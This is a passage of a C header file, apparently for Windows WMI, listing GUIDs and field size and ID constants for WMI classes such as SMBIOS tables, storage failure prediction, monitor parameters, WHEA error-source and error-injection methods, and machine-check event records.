DEFINE_GUID(MSSmBios_Sysid1394_GUID, 0x8f680854,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSSmBios_SysidUUIDList_GUID, 0x8f680853,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSSmBios_SysidUUID_GUID, 0x8f680852,0xa584,0x11d1,0xbf,0x38,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_ATAPISmartData_GUID, 0x78ebc103,0x4cf9,0x11d2,0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_FailurePredictData_GUID, 0x78ebc103,0x4cf9,0x11d2,0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_FailurePredictEvent_GUID, 0x78ebc104,0x4cf9,0x11d2,0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_FailurePredictFunction_GUID, 0x78ebc105,0x4cf9,0x11d2,0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_FailurePredictStatus_GUID, 0x78ebc102,0x4cf9,0x11d2,0xba,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSStorageDriver_FailurePredictThresholds_GUID, 0xdae10783,0xcc31,0x4d2a,0x8a,0x0f,0x86,0x1c,0x04,0x07,0x7a,0x95);
DEFINE_GUID(MSStorageDriver_ScsiInfoExceptions_GUID, 0x1101d829,0x167b,0x4ebf,0xac,0xae,0x28,0xca,0xb7,0xc3,0x48,0x02);
DEFINE_GUID(MSTapeDriveParam_GUID, 0xb9a8cfd5,0x8d72,0x47a4,0xac,0x0e,0x28,0x4a,0x32,0x00,0xf4,0xfb);
DEFINE_GUID(MSTapeDriveProblemEvent_GUID, 0xbc4dd36c,0xfa66,0x4080,0x87,0xa0,0x0c,0x59,0x22,0xeb,0x78,0x87);
DEFINE_GUID(MSTapeMediaCapacity_GUID, 0x8c2147a4,0xff29,0x4336,0xb8,0xa4,0x22,0x7b,0x54,0xcc,0x09,0x66);
DEFINE_GUID(MSTapeProblemDeviceError_GUID, 0x43ec6b13,0x10bb,0x4bf6,0xb7,0x16,0x1c,0x1e,0x2f,0x10,0xbb,0x5f);
DEFINE_GUID(MSTapeProblemIoError_GUID, 0x58fd29f9,0xb516,0x40fd,0x87,0x1a,0x7e,0xe7,0x6d,0x5b,0xb5,0x3e);
DEFINE_GUID(MSTapeSymbolicName_GUID, 0x3fb828f7,0xf119,0x4066,0xb1,0xe6,0xdb,0x40,0x7c,0xe9,0xde,0x91);
DEFINE_GUID(MSVerifierIrpLogEntry_GUID, 0x45068237,0x595d,0x4c7d,0xbd,0x80,0xf8,0x4a,0xdc,0x02,0x57,0xf8);
DEFINE_GUID(MSVerifierIrpLogInformation_GUID, 0x1e2c2980,0xf7db,0x46aa,0x82,0x0e,0x87,0x34,0xfc,0xc2,0x1f,0x4c);
DEFINE_GUID(MSWmi_GuidRegistrationInfo_GUID, 0xb48d49a1,0xe777,0x11d0,0xa5,0x0c,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSWmi_Guid_GUID, 0xf8c60aed,0xef8d,0x4f95,0x9e,0xa8,0xf0,0x43,0x18,0xa0,0x0f,0x30);
DEFINE_GUID(MSWmi_MofData_GUID, 0x05901221,0xd566,0x11d1,0xb2,0xf0,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSWmi_PnPDeviceId_GUID, 0xc7bf35d2,0xaadb,0x11d1,0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSWmi_PnPInstanceNames_GUID, 0xc7bf35d3,0xaadb,0x11d1,0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(MSWmi_ProviderInfo_GUID, 0xc7bf35d0,0xaadb,0x11d1,0xbf,0x4a,0x00,0xa0,0xc9,0x06,0x29,0x10);
DEFINE_GUID(ProcessorPerformance_GUID, 0x7fd18652,0x0cfe,0x40d2,0xb0,0xa1,0x0b,0x06,0x6a,0x87,0x75,0x9e);
DEFINE_GUID(RegisteredGuids_GUID, 0xe3dff7bd,0x3915,0x11d2,0x91,0x03,0x00,0xc0,0x4f,0xb9,0x98,0xa2);
DEFINE_GUID(VideoModeDescriptor_GUID, 0x4a97ed30,0xbfaa,0x491a,0x9d,0xfd,0xb4,0x3a,0xde,0xdb,0xf8,0xe3);
DEFINE_GUID(WHEAErrorInjectionMethods_GUID, 0xe808ff73,0x2093,0x472a,0xa5,0xcc,0xdf,0x24,0xf0,0x31,0xb0,0x35);
DEFINE_GUID(WHEAErrorSourceMethods_GUID, 0x91c3c007,0x185d,0x4d78,0xa7,0x51,0xbf,0xcb,0x31,0xc2,0xc6,0x4d);
DEFINE_GUID(WmiMonitorAnalogVideoInputParams_GUID, 0xa56dbcf9,0xc4f0,0x44a8,0x9c,0x1b,0xbb,0x3b,0x3f,0x77,0x4b,0x4d);
DEFINE_GUID(WmiMonitorBasicDisplayParams_GUID, 0x9831b7e6,0x09ac,0x491f,0x8d,0x07,0x3c,0x3d,0x64,0x9d,0x82,0x40);
DEFINE_GUID(WmiMonitorBrightnessEvent_GUID, 0x123c80d2,0x937f,0x4cfe,0x80,0xf4,0xc4,0x0d,0x59,0x6e,0x48,0xb7);
DEFINE_GUID(WmiMonitorBrightnessMethods_GUID, 0x479b20b4,0x5559,0x46fe,0xbe,0x97,0x7d,0x22,0x21,0x54,0x42,0x1f);
DEFINE_GUID(WmiMonitorBrightness_GUID, 0xd43412ac,0x67f9,0x4fbb,0xa0,0x81,0x17,0x52,0xa2,0xc3,0x3e,0x84);
DEFINE_GUID(WmiMonitorColorCharacteristics_GUID, 0xea324793,0x51bb,0x486a,0xaa,0x9d,0x0f,0x55,0x52,0x35,0x34,0x13);
DEFINE_GUID(WmiMonitorColorXYZinCIE_GUID, 0x01faf041,0x842c,0x4230,0xa3,0x1e,0x13,0x35,0x42,0x8c,0xd8,0xf0);
DEFINE_GUID(WmiMonitorConnectionParams_GUID, 0x2e2d2463,0xb537,0x4da7,0x8e,0xee,0x51,0x30,0x6f,0x1f,0x48,0x2f);
DEFINE_GUID(WmiMonitorDescriptorMethods_GUID, 0x5341576e,0x75c4,0x4aeb,0xa8,0x2b,0x87,0x3c,0xd3,0xc6,0xb3,0x84);
DEFINE_GUID(WmiMonitorDigitalVideoInputParams_GUID, 0x51565945,0x498a,0x4a77,0xac,0xc6,0x15,0x1b,0xec,0xc8,0x05,0xca);
DEFINE_GUID(WmiMonitorID_GUID, 0x671a8285,0x4edb,0x4cae,0x99,0xfe,0x69,0xa1,0x5c,0x48,0xc0,0xbc);
DEFINE_GUID(WmiMonitorListedFrequencyRanges_GUID, 0xe86e9525,0x65b6,0x4b85,0x95,0xc5,0x00,0xbe,0xac,0xc9,0x75,0xed);
DEFINE_GUID(WmiMonitorListedSupportedSourceModes_GUID, 0x6dc76655,0x063c,0x4524,0xa8,0x62,0xb8,0x41,0x0c,0x26,0x28,0x1b);
DEFINE_GUID(WmiMonitorRawEEdidV1Block_GUID, 0xfaee1471,0x5149,0x4a68,0xac,0x2c,0xbf,0x96,0xec,0x09,0xf0,0x04);
DEFINE_GUID(WmiMonitorSupportedDisplayFeatures_GUID, 0x9fa9c28b,0x5e5c,0x4035,0xa5,0xf8,0x67,0xd4,0x55,0x4f,0x8d,0x04);

#endif /* !(defined(MIDL_PASS)) */

#define MSWmi_MofData_Unused1_SIZE sizeof(ULONG)
#define MSWmi_MofData_Unused1_ID 1
#define MSWmi_MofData_Unused2_SIZE sizeof(ULONG)
#define MSWmi_MofData_Unused2_ID 2
#define MSWmi_MofData_Size_SIZE sizeof(ULONG)
#define MSWmi_MofData_Size_ID 3
#define MSWmi_MofData_Unused4_SIZE sizeof(ULONG)
#define MSWmi_MofData_Unused4_ID 4
#define MSWmi_MofData_BinaryMofData_ID 5

#define MSWmi_PnPDeviceId_PnPDeviceId_ID 1
#define MSWmi_PnPInstanceNames_Count_SIZE sizeof(ULONG)
#define MSWmi_PnPInstanceNames_Count_ID 1
#define MSWmi_PnPInstanceNames_InstanceNameList_ID 2

#define MSWmi_Guid_Guid_SIZE sizeof(UCHAR[16])
#define MSWmi_Guid_Guid_ID 1
#define MSWmi_Guid_SIZE (FIELD_OFFSET(MSWmi_Guid, Guid) + MSWmi_Guid_Guid_SIZE)

#define MSWmi_GuidRegistrationInfo_Operation_SIZE sizeof(ULONG)
#define MSWmi_GuidRegistrationInfo_Operation_ID 1
#define MSWmi_GuidRegistrationInfo_GuidCount_SIZE sizeof(ULONG)
#define MSWmi_GuidRegistrationInfo_GuidCount_ID 2
#define MSWmi_GuidRegistrationInfo_GuidList_ID 3

#define MSAcpiInfo_BootArchitecture_SIZE sizeof(ULONG)
#define MSAcpiInfo_BootArchitecture_ID 1
#define MSAcpiInfo_PreferredProfile_SIZE sizeof(ULONG)
#define MSAcpiInfo_PreferredProfile_ID 2
#define MSAcpiInfo_Capabilities_SIZE sizeof(ULONG)
#define MSAcpiInfo_Capabilities_ID 3
#define MSAcpiInfo_SIZE (FIELD_OFFSET(MSAcpiInfo, Capabilities) + MSAcpiInfo_Capabilities_SIZE)

#define GetErrorInjectionCapabilitiesRtn     1

#define GET_INJECTION_CAPABILITIES_OUT_Status_SIZE sizeof(ULONG)
#define GET_INJECTION_CAPABILITIES_OUT_Status_ID 1
#define GET_INJECTION_CAPABILITIES_OUT_Capabilities_SIZE sizeof(ULONG)
#define GET_INJECTION_CAPABILITIES_OUT_Capabilities_ID 2

#define GET_INJECTION_CAPABILITIES_OUT_SIZE (FIELD_OFFSET(GET_INJECTION_CAPABILITIES_OUT, Capabilities) + GET_INJECTION_CAPABILITIES_OUT_Capabilities_SIZE)

#define InjectErrorRtn     2

#define INJECT_HARDWARE_ERROR_IN_ErrorType_SIZE sizeof(ULONG)
#define INJECT_HARDWARE_ERROR_IN_ErrorType_ID 1
#define INJECT_HARDWARE_ERROR_IN_Parameter1_SIZE sizeof(ULONGLONG)
#define INJECT_HARDWARE_ERROR_IN_Parameter1_ID 2
#define INJECT_HARDWARE_ERROR_IN_Parameter2_SIZE sizeof(ULONGLONG)
#define INJECT_HARDWARE_ERROR_IN_Parameter2_ID 3
#define INJECT_HARDWARE_ERROR_IN_Parameter3_SIZE sizeof(ULONGLONG)
#define INJECT_HARDWARE_ERROR_IN_Parameter3_ID 4
#define INJECT_HARDWARE_ERROR_IN_Parameter4_SIZE sizeof(ULONGLONG)
#define INJECT_HARDWARE_ERROR_IN_Parameter4_ID 5

#define INJECT_HARDWARE_ERROR_IN_SIZE (FIELD_OFFSET(INJECT_HARDWARE_ERROR_IN, Parameter4) + INJECT_HARDWARE_ERROR_IN_Parameter4_SIZE)

#define INJECT_HARDWARE_ERROR_OUT_Status_SIZE sizeof(ULONG)
#define INJECT_HARDWARE_ERROR_OUT_Status_ID 6

#define INJECT_HARDWARE_ERROR_OUT_SIZE (FIELD_OFFSET(INJECT_HARDWARE_ERROR_OUT, Status) + INJECT_HARDWARE_ERROR_OUT_Status_SIZE)

#define GetAllErrorSourcesRtn     1

#define GET_ALL_ERROR_SOURCES_OUT_Status_SIZE sizeof(ULONG)
#define GET_ALL_ERROR_SOURCES_OUT_Status_ID 1
#define GET_ALL_ERROR_SOURCES_OUT_Count_SIZE sizeof(ULONG)
#define GET_ALL_ERROR_SOURCES_OUT_Count_ID 2
#define GET_ALL_ERROR_SOURCES_OUT_Length_SIZE sizeof(ULONG)
#define GET_ALL_ERROR_SOURCES_OUT_Length_ID 3
#define GET_ALL_ERROR_SOURCES_OUT_ErrorSourceArray_ID 4

#define GetErrorSourceInfoRtn     2

#define GET_ERROR_SOURCE_INFO_IN_ErrorSourceId_SIZE sizeof(ULONG)
#define GET_ERROR_SOURCE_INFO_IN_ErrorSourceId_ID 2

#define GET_ERROR_SOURCE_INFO_IN_SIZE (FIELD_OFFSET(GET_ERROR_SOURCE_INFO_IN, ErrorSourceId) + GET_ERROR_SOURCE_INFO_IN_ErrorSourceId_SIZE)

#define GET_ERROR_SOURCE_INFO_OUT_Status_SIZE sizeof(ULONG)
#define GET_ERROR_SOURCE_INFO_OUT_Status_ID 1
#define GET_ERROR_SOURCE_INFO_OUT_Length_SIZE sizeof(ULONG)
#define GET_ERROR_SOURCE_INFO_OUT_Length_ID 3
#define GET_ERROR_SOURCE_INFO_OUT_ErrorSourceInfo_ID 4

#define SetErrorSourceInfoRtn     3

#define SET_ERROR_SOURCE_INFO_IN_Length_SIZE sizeof(ULONG)
#define SET_ERROR_SOURCE_INFO_IN_Length_ID 2
#define SET_ERROR_SOURCE_INFO_IN_ErrorSourceInfo_ID 3

#define SET_ERROR_SOURCE_INFO_OUT_Status_SIZE sizeof(ULONG)
#define SET_ERROR_SOURCE_INFO_OUT_Status_ID 1

#define SET_ERROR_SOURCE_INFO_OUT_SIZE (FIELD_OFFSET(SET_ERROR_SOURCE_INFO_OUT, Status) + SET_ERROR_SOURCE_INFO_OUT_Status_SIZE)

#define EnableErrorSourceRtn     4

#define ENABLE_ERROR_SOURCE_IN_ErrorSourceId_SIZE sizeof(ULONG)
#define ENABLE_ERROR_SOURCE_IN_ErrorSourceId_ID 2

#define ENABLE_ERROR_SOURCE_IN_SIZE (FIELD_OFFSET(ENABLE_ERROR_SOURCE_IN, ErrorSourceId) + ENABLE_ERROR_SOURCE_IN_ErrorSourceId_SIZE)

#define ENABLE_ERROR_SOURCE_OUT_Status_SIZE sizeof(ULONG)
#define ENABLE_ERROR_SOURCE_OUT_Status_ID 1

#define ENABLE_ERROR_SOURCE_OUT_SIZE (FIELD_OFFSET(ENABLE_ERROR_SOURCE_OUT, Status) + ENABLE_ERROR_SOURCE_OUT_Status_SIZE)

#define DisableErrorSourceRtn     5

#define DISABLE_ERROR_SOURCE_IN_ErrorSourceId_SIZE sizeof(ULONG)
#define DISABLE_ERROR_SOURCE_IN_ErrorSourceId_ID 2

#define DISABLE_ERROR_SOURCE_IN_SIZE (FIELD_OFFSET(DISABLE_ERROR_SOURCE_IN, ErrorSourceId) + DISABLE_ERROR_SOURCE_IN_ErrorSourceId_SIZE)

#define DISABLE_ERROR_SOURCE_OUT_Status_SIZE sizeof(ULONG)
#define DISABLE_ERROR_SOURCE_OUT_Status_ID 1

#define DISABLE_ERROR_SOURCE_OUT_SIZE (FIELD_OFFSET(DISABLE_ERROR_SOURCE_OUT, Status) + DISABLE_ERROR_SOURCE_OUT_Status_SIZE)

#define MSSmBios_RawSMBiosTables_Used20CallingMethod_SIZE sizeof(BOOLEAN)
#define MSSmBios_RawSMBiosTables_Used20CallingMethod_ID 1
#define MSSmBios_RawSMBiosTables_SmbiosMajorVersion_SIZE sizeof(UCHAR)
#define MSSmBios_RawSMBiosTables_SmbiosMajorVersion_ID 2
#define MSSmBios_RawSMBiosTables_SmbiosMinorVersion_SIZE sizeof(UCHAR)
#define MSSmBios_RawSMBiosTables_SmbiosMinorVersion_ID 3
#define MSSmBios_RawSMBiosTables_DmiRevision_SIZE sizeof(UCHAR)
#define MSSmBios_RawSMBiosTables_DmiRevision_ID 4
#define MSSmBios_RawSMBiosTables_Size_SIZE sizeof(ULONG)
#define MSSmBios_RawSMBiosTables_Size_ID 5
#define MSSmBios_RawSMBiosTables_SMBiosData_ID 6

#define MSMCAEvent_Header_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_Header_RecordId_ID 1
#define MSMCAEvent_Header_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_Header_ErrorSeverity_ID 2
#define MSMCAEvent_Header_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_Header_Type_ID 3
#define MSMCAEvent_Header_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_Header_Cpu_ID 4
#define MSMCAEvent_Header_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_Header_AdditionalErrors_ID 5
#define MSMCAEvent_Header_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_Header_LogToEventlog_ID 6

#define MSMCAEvent_Header_SIZE (FIELD_OFFSET(MSMCAEvent_Header, LogToEventlog) + MSMCAEvent_Header_LogToEventlog_SIZE)

#define MSMCAEvent_BusError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_BusError_RecordId_ID 1
#define MSMCAEvent_BusError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_BusError_ErrorSeverity_ID 2
#define MSMCAEvent_BusError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_Type_ID 3
#define MSMCAEvent_BusError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_Cpu_ID 4
#define MSMCAEvent_BusError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_AdditionalErrors_ID 5
#define MSMCAEvent_BusError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_LogToEventlog_ID 6
#define MSMCAEvent_BusError_Participation_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_Participation_ID 7
#define MSMCAEvent_BusError_MemoryHierarchyLevel_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_MemoryHierarchyLevel_ID 8
#define MSMCAEvent_BusError_RequestType_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_RequestType_ID 9
#define MSMCAEvent_BusError_MemOrIo_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_MemOrIo_ID 10
#define MSMCAEvent_BusError_Address_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_BusError_Address_ID 11
#define MSMCAEvent_BusError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_BusError_Size_ID 12
#define MSMCAEvent_BusError_RawRecord_ID 13

#define MSMCAEvent_TLBError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_TLBError_RecordId_ID 1
#define MSMCAEvent_TLBError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_TLBError_ErrorSeverity_ID 2
#define MSMCAEvent_TLBError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_Type_ID 3
#define MSMCAEvent_TLBError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_Cpu_ID 4
#define MSMCAEvent_TLBError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_AdditionalErrors_ID 5
#define MSMCAEvent_TLBError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_LogToEventlog_ID 6
#define MSMCAEvent_TLBError_TransactionType_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_TransactionType_ID 7
#define MSMCAEvent_TLBError_MemoryHierarchyLevel_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_MemoryHierarchyLevel_ID 8
#define MSMCAEvent_TLBError_Address_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_TLBError_Address_ID 9
#define MSMCAEvent_TLBError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_TLBError_Size_ID 10
#define MSMCAEvent_TLBError_RawRecord_ID 11

#define MSMCAEvent_MemoryHierarchyError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryHierarchyError_RecordId_ID 1
#define MSMCAEvent_MemoryHierarchyError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_MemoryHierarchyError_ErrorSeverity_ID 2
#define MSMCAEvent_MemoryHierarchyError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_Type_ID 3
#define MSMCAEvent_MemoryHierarchyError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_Cpu_ID 4
#define MSMCAEvent_MemoryHierarchyError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_AdditionalErrors_ID 5
#define MSMCAEvent_MemoryHierarchyError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_LogToEventlog_ID 6
#define MSMCAEvent_MemoryHierarchyError_TransactionType_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_TransactionType_ID 7
#define MSMCAEvent_MemoryHierarchyError_MemoryHierarchyLevel_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_MemoryHierarchyLevel_ID 8
#define MSMCAEvent_MemoryHierarchyError_RequestType_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_RequestType_ID 9
#define MSMCAEvent_MemoryHierarchyError_Address_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryHierarchyError_Address_ID 10
#define MSMCAEvent_MemoryHierarchyError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryHierarchyError_Size_ID 11
#define MSMCAEvent_MemoryHierarchyError_RawRecord_ID 12

#define MSMCAEvent_CPUError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_CPUError_RecordId_ID 1
#define MSMCAEvent_CPUError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_CPUError_ErrorSeverity_ID 2
#define MSMCAEvent_CPUError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_Type_ID 3
#define MSMCAEvent_CPUError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_Cpu_ID 4
#define MSMCAEvent_CPUError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_AdditionalErrors_ID 5
#define MSMCAEvent_CPUError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_LogToEventlog_ID 6
#define MCACpuCacheError 0
#define MCACpuTlbError 1
#define MCACpuBusError 2
#define MCACpuRegFileError 3
#define MCACpuMSError 4
#define MSMCAEvent_CPUError_MajorErrorType_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_MajorErrorType_ID 7
#define MSMCAEvent_CPUError_Level_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_Level_ID 8
#define MSMCAEvent_CPUError_CacheOp_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_CacheOp_ID 9
#define MSMCAEvent_CPUError_CacheMesi_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_CacheMesi_ID 10
#define MSMCAEvent_CPUError_TLBOp_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_TLBOp_ID 11
#define MSMCAEvent_CPUError_BusType_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_BusType_ID 12
#define MSMCAEvent_CPUError_BusSev_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_BusSev_ID 13
#define MSMCAEvent_CPUError_RegFileId_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_RegFileId_ID 14
#define MSMCAEvent_CPUError_RegFileOp_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_RegFileOp_ID 15
#define MSMCAEvent_CPUError_MSSid_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_MSSid_ID 16
#define MSMCAEvent_CPUError_MSOp_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_MSOp_ID 17
#define MSMCAEvent_CPUError_MSArrayId_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_MSArrayId_ID 18
#define MSMCAEvent_CPUError_MSIndex_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_MSIndex_ID 19
#define MSMCAEvent_CPUError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_CPUError_Size_ID 20
#define MSMCAEvent_CPUError_RawRecord_ID 21

#define MSMCAEvent_MemoryError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_RecordId_ID 1
#define MSMCAEvent_MemoryError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_MemoryError_ErrorSeverity_ID 2
#define MSMCAEvent_MemoryError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryError_Type_ID 3
#define MSMCAEvent_MemoryError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryError_Cpu_ID 4
#define MSMCAEvent_MemoryError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryError_AdditionalErrors_ID 5
#define MSMCAEvent_MemoryError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryError_LogToEventlog_ID 6
#define MSMCAEvent_MemoryError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_VALIDATION_BITS_ID 7
#define MSMCAEvent_MemoryError_MEM_ERROR_STATUS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_MEM_ERROR_STATUS_ID 8
#define MSMCAEvent_MemoryError_MEM_PHYSICAL_ADDR_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_MEM_PHYSICAL_ADDR_ID 9
#define MSMCAEvent_MemoryError_MEM_PHYSICAL_MASK_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_MEM_PHYSICAL_MASK_ID 10
#define MSMCAEvent_MemoryError_RESPONDER_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_RESPONDER_ID_ID 11
#define MSMCAEvent_MemoryError_TARGET_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_TARGET_ID_ID 12
#define MSMCAEvent_MemoryError_REQUESTOR_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_REQUESTOR_ID_ID 13
#define MSMCAEvent_MemoryError_BUS_SPECIFIC_DATA_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryError_BUS_SPECIFIC_DATA_ID 14
#define MSMCAEvent_MemoryError_MEM_NODE_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_NODE_ID 15
#define MSMCAEvent_MemoryError_MEM_CARD_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_CARD_ID 16
#define MSMCAEvent_MemoryError_MEM_BANK_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_BANK_ID 17
#define MSMCAEvent_MemoryError_xMEM_DEVICE_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_xMEM_DEVICE_ID 18
#define MSMCAEvent_MemoryError_MEM_MODULE_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_MODULE_ID 19
#define MSMCAEvent_MemoryError_MEM_ROW_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_ROW_ID 20
#define MSMCAEvent_MemoryError_MEM_COLUMN_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_COLUMN_ID 21
#define MSMCAEvent_MemoryError_MEM_BIT_POSITION_SIZE sizeof(USHORT)
#define MSMCAEvent_MemoryError_MEM_BIT_POSITION_ID 22
#define MSMCAEvent_MemoryError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_MemoryError_Size_ID 23
#define MSMCAEvent_MemoryError_RawRecord_ID 24

#define MSMCAEvent_PCIBusError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_RecordId_ID 1
#define MSMCAEvent_PCIBusError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIBusError_ErrorSeverity_ID 2
#define MSMCAEvent_PCIBusError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIBusError_Type_ID 3
#define MSMCAEvent_PCIBusError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIBusError_Cpu_ID 4
#define MSMCAEvent_PCIBusError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIBusError_AdditionalErrors_ID 5
#define MSMCAEvent_PCIBusError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIBusError_LogToEventlog_ID 6
#define MSMCAEvent_PCIBusError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_VALIDATION_BITS_ID 7
#define MSMCAEvent_PCIBusError_PCI_BUS_ERROR_STATUS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_ERROR_STATUS_ID 8
#define MSMCAEvent_PCIBusError_PCI_BUS_ADDRESS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_ADDRESS_ID 9
#define MSMCAEvent_PCIBusError_PCI_BUS_DATA_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_DATA_ID 10
#define MSMCAEvent_PCIBusError_PCI_BUS_CMD_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_CMD_ID 11
#define MSMCAEvent_PCIBusError_PCI_BUS_REQUESTOR_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_REQUESTOR_ID_ID 12
#define MSMCAEvent_PCIBusError_PCI_BUS_RESPONDER_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_RESPONDER_ID_ID 13
#define MSMCAEvent_PCIBusError_PCI_BUS_TARGET_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIBusError_PCI_BUS_TARGET_ID_ID 14
#define MSMCAEvent_PCIBusError_PCI_BUS_ERROR_TYPE_SIZE sizeof(USHORT)
#define MSMCAEvent_PCIBusError_PCI_BUS_ERROR_TYPE_ID 15
